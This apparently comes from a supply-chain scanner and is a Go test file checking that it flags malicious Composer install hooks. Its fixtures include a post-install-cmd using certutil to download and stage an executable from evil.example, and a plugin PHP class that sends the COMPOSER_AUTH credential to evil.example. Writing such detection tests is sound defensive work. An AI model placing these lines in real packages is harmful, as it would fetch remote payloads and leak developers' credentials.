package composer_test

// Decision D-27 regression tests.
//
// The composer-plugin-cradle fixture was silent for two reasons: the adapter
// bailed out of all extraction when vendor/ was absent (so the root project's
// own post-install cradle was never read), and a plugin's PHP entrypoint —
// where a cradle can hide its fetch-and-run — was never scanned. Both are
// closed here and pinned from both sides.

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/check"
	"ihbv.io/depsnort/internal/check/builtin"
	"ihbv.io/depsnort/internal/ecosystem/composer"
	"ihbv.io/depsnort/internal/graph"
)

func runVC002(g *graph.Graph) map[string]int {
	ctx := &check.Context{Graph: g}
	counts := map[string]int{}
	for _, c := range []check.Check{
		builtin.HookNetwork{},        // VC-002b
		builtin.HookCredentials{},    // VC-002c
		builtin.HookExfilCapable{},   // VC-002d (block)
		builtin.HookObfuscated{},     // VC-002e
		builtin.HookDownloadCradle{}, // VC-002f (block)
	} {
		for _, f := range c.Run(ctx) {
			counts[f.CheckID]++
		}
	}
	return counts
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func composerRoot(name string) *graph.Graph {
	g := graph.New()
	id := "pkg:composer/" + name + "@1.0.0"
	g.AddNode(&graph.Node{ID: id, Kind: graph.KindPackage, Ecosystem: "composer", Name: name, Version: "1.0.0", Depth: 0})
	g.MarkRoot(id)
	return g
}

// The root project's own post-install cradle must be seen even with no vendor/
// on disk — the bug D-27 fixes.
func TestComposerRootScriptCradleWithoutVendor(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "composer.json"), `{
	  "name": "adversarial/cradle",
	  "type": "library",
	  "scripts": {
	    "post-install-cmd": "certutil -urlcache -split -f https://evil.example/p.exe %TEMP%\\p.exe"
	  }
	}`)
	g := composerRoot("adversarial/cradle")
	if err := composer.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	// The root manifest is now read without vendor/ (D-27), and a certutil
	// download cradle blocks rather than merely warning (D-28).
	if c := runVC002(g); c["VC-002f"] < 1 {
		t.Errorf("a certutil download cradle in post-install-cmd must BLOCK (VC-002f) without vendor/; got %v", c)
	}
}

// A composer-plugin whose payload lives in the plugin PHP class — resolved via
// the PSR-4 autoload map — must be scanned. Fetch + named credential = BLOCK.
func TestComposerPluginPHPEntrypointScanned(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "composer.json"), `{
	  "name": "adversarial/plugin",
	  "type": "composer-plugin",
	  "extra": { "class": "Adversarial\\Plugin" },
	  "autoload": { "psr-4": { "Adversarial\\": "src/" } }
	}`)
	write(t, filepath.Join(dir, "src", "Plugin.php"), `<?php
namespace Adversarial;
class Plugin {
    public function activate() {
        $auth = getenv('COMPOSER_AUTH');
        file_get_contents('https://evil.example/collect?d=' . $auth);
    }
}`)
	g := composerRoot("adversarial/plugin")
	if err := composer.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); c["VC-002d"] < 1 {
		t.Errorf("a plugin whose PHP entrypoint reads COMPOSER_AUTH and reaches the network must BLOCK; got %v", c)
	}
}

// An ordinary composer-plugin — no scripts, a benign entrypoint — must not fire
// a capability finding. Plugin-ness alone is CapExec, which no VC-002 check
// gates on; that is the false-positive discipline.
func TestComposerOrdinaryPluginSilent(t *testing.T) {
	dir := t.TempDir()
	write(t, filepath.Join(dir, "composer.json"), `{
	  "name": "honest/plugin",
	  "type": "composer-plugin",
	  "extra": { "class": "Honest\\Plugin" },
	  "autoload": { "psr-4": { "Honest\\": "src/" } }
	}`)
	write(t, filepath.Join(dir, "src", "Plugin.php"), `<?php
namespace Honest;
class Plugin {
    public function activate() { /* register a command, nothing more */ }
}`)
	g := composerRoot("honest/plugin")
	if err := composer.New().ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("extract: %v", err)
	}
	if c := runVC002(g); len(c) != 0 {
		t.Errorf("an ordinary composer-plugin must not fire any VC-002 finding; got %v", c)
	}
}
